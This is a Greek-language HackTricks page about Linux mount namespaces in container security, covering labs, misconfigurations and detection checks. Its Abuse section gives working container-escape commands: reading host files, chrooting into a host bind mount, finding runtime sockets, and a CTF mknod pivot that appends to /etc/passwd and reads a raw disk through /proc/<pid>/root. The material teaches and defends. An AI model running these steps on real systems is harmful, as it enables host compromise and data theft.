# Mount Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Επισκόπηση

Το Mount Namespace ελέγχει το **mount table** που βλέπει μια διεργασία. Αυτό αποτελεί ένα από τα σημαντικότερα χαρακτηριστικά απομόνωσης containers, επειδή το root filesystem, τα bind mounts, τα tmpfs mounts, η προβολή procfs, η έκθεση του sysfs και πολλά βοηθητικά mounts ειδικά για runtime εκφράζονται όλα μέσω αυτού του mount table. Δύο διεργασίες μπορεί να έχουν πρόσβαση στα `/`, `/proc`, `/sys` ή `/tmp`, όμως το σε τι αντιστοιχούν αυτά τα paths εξαρτάται από το mount namespace στο οποίο βρίσκονται.

Από την άποψη του container security, το mount namespace συχνά αποτελεί τη διαφορά μεταξύ του «αυτό είναι ένα προσεκτικά προετοιμασμένο application filesystem» και του «αυτή η διεργασία μπορεί να δει ή να επηρεάσει άμεσα το filesystem του host». Γι' αυτό τα bind mounts, τα `hostPath` volumes, οι privileged mount operations και οι writable εκθέσεις των `/proc` ή `/sys` σχετίζονται όλα με αυτό το namespace.

## Λειτουργία

Όταν ένα runtime εκκινεί ένα container, συνήθως δημιουργεί ένα νέο mount namespace, προετοιμάζει ένα root filesystem για το container, κάνει mount το procfs και άλλα απαραίτητα βοηθητικά filesystems και, στη συνέχεια, προσθέτει προαιρετικά bind mounts, tmpfs mounts, secrets, config maps ή host paths. Μόλις η διεργασία εκτελείται μέσα στο namespace, το σύνολο των mounts που βλέπει είναι σε μεγάλο βαθμό αποσυνδεδεμένο από την προεπιλεγμένη προβολή του host. Ο host μπορεί ακόμη να βλέπει το πραγματικό underlying filesystem, όμως το container βλέπει την εκδοχή που έχει συναρμολογήσει γι' αυτό το runtime.

Αυτό είναι ισχυρό, επειδή επιτρέπει στο container να θεωρεί ότι διαθέτει το δικό του root filesystem, παρόλο που ο host εξακολουθεί να διαχειρίζεται τα πάντα. Είναι επίσης επικίνδυνο, επειδή αν το runtime εκθέσει το λάθος mount, η διεργασία αποκτά ξαφνικά ορατότητα σε resources του host, τα οποία το υπόλοιπο security model ενδέχεται να μην είχε σχεδιαστεί για να προστατεύει.

## Lab

Μπορείτε να δημιουργήσετε ένα private mount namespace με:
```bash
sudo unshare --mount --fork bash
mount --make-rprivate /
mkdir -p /tmp/ns-lab
mount -t tmpfs tmpfs /tmp/ns-lab
mount | grep ns-lab
```
Αν ανοίξετε ένα άλλο shell εκτός αυτού του namespace και εξετάσετε τον mount table, θα δείτε ότι το tmpfs mount υπάρχει μόνο μέσα στο απομονωμένο mount namespace. Αυτή είναι μια χρήσιμη άσκηση, επειδή δείχνει ότι η απομόνωση των mounts δεν είναι αφηρημένη θεωρία· ο kernel παρουσιάζει κυριολεκτικά έναν διαφορετικό mount table στη διεργασία.

Αν ανοίξετε ένα άλλο shell εκτός αυτού του namespace και εξετάσετε τον mount table, το tmpfs mount θα υπάρχει μόνο μέσα στο απομονωμένο mount namespace.

Μέσα στα containers, μια γρήγορη σύγκριση είναι:
```bash
docker run --rm debian:stable-slim mount | head
docker run --rm -v /:/host debian:stable-slim mount | grep /host
```
Το δεύτερο παράδειγμα δείχνει πόσο εύκολο είναι μια ρύθμιση runtime να δημιουργήσει ένα τεράστιο κενό ασφαλείας στο όριο του filesystem.

## Χρήση Runtime

Τα Docker, Podman, stacks που βασίζονται στο containerd και το CRI-O βασίζονται όλα σε ένα private mount namespace για τα κανονικά containers. Το Kubernetes χρησιμοποιεί τον ίδιο μηχανισμό για volumes, projected secrets, config maps και `hostPath` mounts. Τα περιβάλλοντα Incus/LXC βασίζονται επίσης σε μεγάλο βαθμό στα mount namespaces, ειδικά επειδή τα system containers συχνά εκθέτουν πιο πλούσια και περισσότερο παρόμοια με machine filesystems σε σχέση με τα application containers.

Αυτό σημαίνει ότι όταν εξετάζετε ένα πρόβλημα filesystem σε container, συνήθως δεν εξετάζετε κάποια μεμονωμένη ιδιομορφία του Docker. Εξετάζετε ένα πρόβλημα mount namespace και runtime configuration, εκφρασμένο μέσω όποιας πλατφόρμας εκκίνησε το workload.

## Λανθασμένες ρυθμίσεις

Το πιο προφανές και επικίνδυνο λάθος είναι η έκθεση του host root filesystem ή κάποιου άλλου ευαίσθητου host path μέσω bind mount, για παράδειγμα `-v /:/host` ή ενός writable `hostPath` στο Kubernetes. Σε αυτό το σημείο, το ερώτημα δεν είναι πλέον «μπορεί το container με κάποιον τρόπο να κάνει escape;», αλλά «πόσο χρήσιμο host content είναι ήδη άμεσα ορατό και writable;» Ένα writable host bind mount συχνά μετατρέπει το υπόλοιπο exploit σε μια απλή διαδικασία τοποθέτησης αρχείων, chrooting, τροποποίησης configuration ή εντοπισμού runtime socket.

Ένα ακόμη συνηθισμένο πρόβλημα είναι η έκθεση του host `/proc` ή `/sys` με τρόπους που παρακάμπτουν την ασφαλέστερη container view. Αυτά τα filesystems δεν είναι συνηθισμένα data mounts· αποτελούν interfaces προς την κατάσταση του kernel και των processes. Αν το workload αποκτήσει άμεση πρόσβαση στις host versions, πολλές από τις παραδοχές πίσω από το container hardening παύουν να εφαρμόζονται με ασφαλή τρόπο.

Οι read-only προστασίες έχουν επίσης σημασία. Ένα read-only root filesystem δεν ασφαλίζει μαγικά ένα container, αλλά αφαιρεί μεγάλο μέρος του χώρου staging του attacker και καθιστά δυσκολότερα το persistence, την τοποθέτηση helper binaries και το config tampering. Αντίθετα, ένα writable root ή writable host bind mount παρέχει στον attacker χώρο για να προετοιμάσει το επόμενο βήμα.

## Abuse

Όταν το mount namespace χρησιμοποιείται λανθασμένα, οι attackers κάνουν συνήθως ένα από τέσσερα πράγματα. **Διαβάζουν host data** που θα έπρεπε να παραμείνουν εκτός container. **Τροποποιούν host configuration** μέσω writable bind mounts. **Κάνουν mount ή remount πρόσθετων resources** αν τα capabilities και το seccomp το επιτρέπουν. Ή **αποκτούν πρόσβαση σε ισχυρά sockets και runtime state directories** που τους επιτρέπουν να ζητήσουν από την ίδια την container platform περισσότερη πρόσβαση.

Αν το container μπορεί ήδη να δει το host filesystem, το υπόλοιπο security model αλλάζει αμέσως.

Όταν υποψιάζεστε host bind mount, επιβεβαιώστε πρώτα τι είναι διαθέσιμο και αν είναι writable:
```bash
mount | grep -E ' /host| /mnt| /rootfs|bind'
find /host -maxdepth 2 -ls 2>/dev/null | head -n 50
touch /host/tmp/ht_test 2>/dev/null && echo "host write works"
```
Εάν το root filesystem του host είναι mounted read-write, η άμεση πρόσβαση στο host είναι συχνά τόσο απλή όσο:
```bash
ls -la /host
cat /host/etc/passwd | head
chroot /host /bin/bash 2>/dev/null || echo "chroot failed"
```
Αν ο στόχος είναι η προνομιακή πρόσβαση κατά τον χρόνο εκτέλεσης αντί για άμεσο chrooting, απαριθμήστε τα sockets και την κατάσταση runtime:
```bash
find /host/run /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
```
Εάν υπάρχει το `CAP_SYS_ADMIN`, ελέγξτε επίσης αν μπορούν να δημιουργηθούν νέα mounts μέσα από το container:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount -o bind /host /tmp/m 2>/dev/null && echo "bind mount works"
```
### Πλήρες Παράδειγμα: Two-Shell `mknod` Pivot

Μια πιο εξειδικευμένη διαδρομή abuse εμφανίζεται όταν ο root user του container μπορεί να δημιουργήσει block devices, το host και το container μοιράζονται μια user identity με χρήσιμο τρόπο και ο attacker έχει ήδη ένα low-privilege foothold στο host. Σε αυτή την περίπτωση, το container μπορεί να δημιουργήσει ένα device node όπως το `/dev/sda`, και ο low-privilege host user μπορεί αργότερα να το διαβάσει μέσω του `/proc/<pid>/root/` για το αντίστοιχο container process.

Μέσα στο container:
```bash
cd /
mknod sda b 8 0
chmod 777 sda
echo 'augustus:x:1000:1000:augustus:/home/augustus:/bin/bash' >> /etc/passwd
/bin/sh
```
Από το host, ως ο αντίστοιχος χρήστης χαμηλών δικαιωμάτων, αφού εντοπίσετε το PID του container shell:
```bash
ps -auxf | grep /bin/sh
grep -a 'HTB{' /proc/<pid>/root/sda
```
Το σημαντικό συμπέρασμα δεν είναι η ακριβής αναζήτηση string του CTF. Είναι ότι η έκθεση του mount namespace μέσω του `/proc/<pid>/root/` μπορεί να επιτρέψει σε έναν χρήστη του host να επαναχρησιμοποιήσει device nodes που δημιουργήθηκαν από το container, ακόμη και όταν η πολιτική συσκευών του cgroup απέτρεπε την άμεση χρήση τους μέσα στο ίδιο το container.

## Έλεγχοι

Αυτές οι εντολές υπάρχουν για να σας δείξουν την προβολή του filesystem στην οποία εκτελείται πραγματικά η τρέχουσα διεργασία. Ο στόχος είναι να εντοπίσετε mounts που προέρχονται από το host, ευαίσθητα paths με δικαίωμα εγγραφής και οτιδήποτε φαίνεται ευρύτερο από ένα κανονικό root filesystem container εφαρμογής.
```bash
mount                               # Simple mount table overview
findmnt                             # Structured mount tree with source and target
cat /proc/self/mountinfo | head -n 40   # Kernel-level mount details
```
Τι είναι ενδιαφέρον εδώ:

- Τα Bind mounts από το host, ιδιαίτερα τα `/`, `/proc`, `/sys`, οι κατάλογοι κατάστασης του runtime ή οι τοποθεσίες socket, θα πρέπει να ξεχωρίζουν αμέσως.
- Τα μη αναμενόμενα read-write mounts είναι συνήθως σημαντικότερα από τον μεγάλο αριθμό read-only helper mounts.
- Το `mountinfo` είναι συχνά το καλύτερο σημείο για να δείτε αν μια διαδρομή προέρχεται πραγματικά από το host ή υποστηρίζεται από overlay.

Αυτοί οι έλεγχοι καθορίζουν **ποιοι πόροι είναι ορατοί σε αυτό το namespace**, **ποιοι προέρχονται από το host** και **ποιοι είναι εγγράψιμοι ή ευαίσθητοι από άποψη ασφάλειας**.
{{#include ../../../../../banners/hacktricks-training.md}}
